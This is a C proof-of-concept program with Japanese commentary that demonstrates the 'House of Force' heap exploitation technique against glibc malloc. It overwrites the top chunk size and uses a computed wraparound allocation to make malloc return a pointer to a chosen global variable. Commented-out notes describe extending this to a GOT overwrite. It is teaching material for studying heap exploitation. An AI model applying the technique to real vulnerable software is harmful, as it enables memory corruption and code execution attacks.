/*

   この PoC は ASLR が有効でも動作します。
   GOT エントリを上書きするため、この手法をそのまま適用するには RELRO が無効である必要があります。
   RELRO が有効な場合は、Malloc Des Maleficarum で提案されているように、スタック上のチャンクを返させる方法を試すこともできます。
   ( http://phrack.org/issues/66/10.html )

   Ubuntu 14.04(64ビット)、Ubuntu 18.04 でテスト済みです。

*/


#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

char bss_var[] = "This is a string that we want to overwrite.";

int main(int argc , char* argv[])
{
	fprintf(stderr, "\nHouse of Force へようこそ\n\n");
	fprintf(stderr, "House of Force の考え方は、top chunkを上書きして、malloc に任意の値を返させることです。\n");
	fprintf(stderr, "top chunkは特別なチャンク(chunk)です。メモリ上で最後にあり、"
		"malloc が OS にさらに領域を要求するときにサイズが変更されるチャンクです。\n");

	fprintf(stderr, "\n最終的に、これを使って %p にある変数を上書きします。\n", bss_var);
	fprintf(stderr, "現在の値: %s\n", bss_var);



	fprintf(stderr, "\n最初のチャンクを割り当てましょう。wildernessから領域を取ります。\n");
	intptr_t *p1 = malloc(256);
	fprintf(stderr, "256 バイトのチャンクが %p に割り当てられました。\n", p1 - 2);

	fprintf(stderr, "\nこれで、ヒープは2つのチャンクで構成されています。割り当てたチャンクと、top chunk/wildernessです。\n");
	int real_size = malloc_usable_size(p1);
	fprintf(stderr, "割り当てたチャンクの実際のサイズ(アラインメントなどを含む)は %ld です。\n", real_size + sizeof(long)*2);

	fprintf(stderr, "\nでは、top chunkのヘッダを上書きできる脆弱性を再現しましょう\n");

	//----- VULNERABILITY ----
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
	fprintf(stderr, "\ntop chunkは %p から始まります\n", ptr_top);

	fprintf(stderr, "\ntop chunkのサイズを大きな値で上書きして、malloc が mmap を決して呼ばないようにします。\n");
	fprintf(stderr, "top chunkの元のサイズ %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
	fprintf(stderr, "top chunkの新しいサイズ %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	//------------------------

	fprintf(stderr, "\nwildernessのサイズは、これで巨大になりました。malloc() が mmap を呼ぶことなく、何でも割り当てられます。\n"
	   "次に、目的の領域のすぐ手前まで到達するチャンクを(整数オーバーフローを使って)割り当てます。\n"
	   "その後、目的の領域のちょうど上にチャンクを割り当てられるようになります。\n");

	/*
	 * evil_size は次のように計算します(nb は要求したバイト数 + メタデータ用の領域です):
	 * new_top = old_top + nb
	 * nb = new_top - old_top
	 * req + 2sizeof(long) = new_top - old_top
	 * req = new_top - old_top - 2sizeof(long)
	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
	 * req = dest - old_top - 4*sizeof(long)
	 */
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
	fprintf(stderr, "\n書き込みたい値は %p にあり、top chunkは %p にあります。ヘッダのサイズを考慮して、\n"
	   "%#lx バイトを malloc します。\n", bss_var, ptr_top, evil_size);
	void *new_ptr = malloc(evil_size);
	fprintf(stderr, "予想どおり、新しいポインタは古いtop chunkと同じ場所にあります: %p\n", new_ptr - sizeof(long)*2);

	void* ctr_chunk = malloc(100);
	fprintf(stderr, "\nこれで、次に割り当てるチャンクは、標的のバッファを指します。\n");
	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
	fprintf(stderr, "これで、ようやくその値を上書きできます:\n");

	fprintf(stderr, "... 元の文字列: %s\n", bss_var);
	fprintf(stderr, "... strcpy で \"YEAH!!!\" を上書きします...\n");
	strcpy(ctr_chunk, "YEAH!!!");
	fprintf(stderr, "... 新しい文字列: %s\n", bss_var);

	assert(ctr_chunk == bss_var);


	// さらなる補足:
	//fprintf(stderr, "この制御された malloc は、サイズ引数 evil_size = malloc_got_address - 8 - p2_guessed で呼び出されます\n\n");
	//fprintf(stderr, "これは、main_arena->top ポインタが現在の av->top + malloc_size に設定され、"
	//	"この結果を malloc_got_address-8 のアドレスに \nしたいからです\n\n");
	//fprintf(stderr, "そのために、malloc_got_address-8 = p2_guessed + evil_size とします\n\n");
	//fprintf(stderr, "この大きな malloc の後、av->top はこのように malloc_got_address-8 に設定されます\n\n");
	//fprintf(stderr, "その後、malloc を新たに呼び出すと av->top+8 ( ヘッダ分の +8 バイト )が返され、"
	//	"\n基本的に (malloc_got_address-8)+8 = malloc_got_address にあるチャンクが返されます\n\n");

	//fprintf(stderr, "evil_size の大きなチャンクはここに割り当てられました 0x%08x\n",p2);
	//fprintf(stderr, "main_arena の値 av->top は malloc_got_address-8=0x%08x に設定されました\n",malloc_got_address);

	//fprintf(stderr, "この最後の malloc は remainder のコードから処理され、先に差し込んだ av->top+8 を返します\n");
}
